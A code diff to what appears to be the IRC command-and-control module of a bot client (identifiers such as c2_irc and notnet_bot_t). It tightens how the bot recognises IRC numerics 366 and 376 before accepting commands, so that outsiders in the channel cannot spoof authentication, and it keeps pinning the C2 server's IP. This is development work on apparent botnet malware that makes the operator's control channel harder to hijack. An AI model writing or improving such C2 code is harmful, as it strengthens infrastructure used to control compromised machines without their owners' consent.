@@ -201,36 +201,54 @@ int irc_read(notnet_bot_t *bot, char *buf, int len) {
         }
     }
     
-    /* Check for JOIN confirmation (366 End of NAMES) */
-    if (strstr(buf, "366")) {
-        log_info("IRC: joined channel %s", bot->c2_irc.channel);
-        bot->c2_irc.authenticated = 1;
-        /* SECURITY FIX (#10): Pin the connected peer IP on first auth */
-        if (!bot->c2_irc.dns_pinned) {
-            struct sockaddr_in sin;
-            socklen_t slen = sizeof(sin);
-            getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
-            bot->c2_irc.pinned_addr = sin.sin_addr;
-            bot->c2_irc.dns_pinned = 1;
-            log_info("IRC: DNS pin set to %s", inet_ntoa(sin.sin_addr));
+    /* Check for JOIN confirmation (366 End of NAMES)
+     * SECURITY FIX (#29): Use strncmp on the IRC numeric response format
+     * instead of strstr("366"). The old check matched any occurrence of
+     * "366" anywhere in the buffer, including in PRIVMSG text, allowing
+     * any user to trigger false authentication. */
+    if (strncmp(buf, ":", 1) == 0) {
+        char *space = strchr(buf + 1, ' ');
+        if (space) {
+            char *code = space + 1;
+            /* Format: :server 366 client #chan :End of NAMES list */
+            if (strncmp(code, "366", 3) == 0 && (code[3] == ' ' || code[3] == '\0')) {
+                log_info("IRC: joined channel %s", bot->c2_irc.channel);
+                bot->c2_irc.authenticated = 1;
+                /* SECURITY FIX (#10): Pin the connected peer IP on first auth */
+                if (!bot->c2_irc.dns_pinned) {
+                    struct sockaddr_in sin;
+                    socklen_t slen = sizeof(sin);
+                    getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
+                    bot->c2_irc.pinned_addr = sin.sin_addr;
+                    bot->c2_irc.dns_pinned = 1;
+                    log_info("IRC: DNS pin set to %s", inet_ntoa(sin.sin_addr));
+                }
+            }
         }
     }
-    
-    /* Check for MOTD complete (376 End of MOTD) - sets authenticated for non-channels mode */
-    if (strstr(buf, "376")) {
-        log_info("IRC: MOTD complete, authenticated");
-        bot->c2_irc.authenticated = 1;
-        /* SECURITY FIX (#10): Pin the connected peer IP on first auth */
-        if (!bot->c2_irc.dns_pinned) {
-            struct sockaddr_in sin;
-            socklen_t slen = sizeof(sin);
-            getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
-            bot->c2_irc.pinned_addr = sin.sin_addr;
-            bot->c2_irc.dns_pinned = 1;
-            log_info("IRC: DNS pin set to %s", inet_ntoa(sin.sin_addr));
+
+    /* Check for MOTD complete (376 End of MOTD) - sets authenticated for non-channels mode
+     * SECURITY FIX (#29): Same strstr("376") false-match issue as above. */
+    if (strncmp(buf, ":", 1) == 0) {
+        char *space = strchr(buf + 1, ' ');
+        if (space) {
+            char *code = space + 1;
+            if (strncmp(code, "376", 3) == 0 && (code[3] == ' ' || code[3] == '\0')) {
+                log_info("IRC: MOTD complete, authenticated");
+                bot->c2_irc.authenticated = 1;
+                /* SECURITY FIX (#10): Pin the connected peer IP on first auth */
+                if (!bot->c2_irc.dns_pinned) {
+                    struct sockaddr_in sin;
+                    socklen_t slen = sizeof(sin);
+                    getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
+                    bot->c2_irc.pinned_addr = sin.sin_addr;
+                    bot->c2_irc.dns_pinned = 1;
+                    log_info("IRC: DNS pin set to %s", inet_ntoa(sin.sin_addr));
+                }
+            }
         }
     }
-    
+
     /* Process PRIVMSG commands */
     char *privmsg = strstr(buf, "PRIVMSG");
     if (privmsg) {
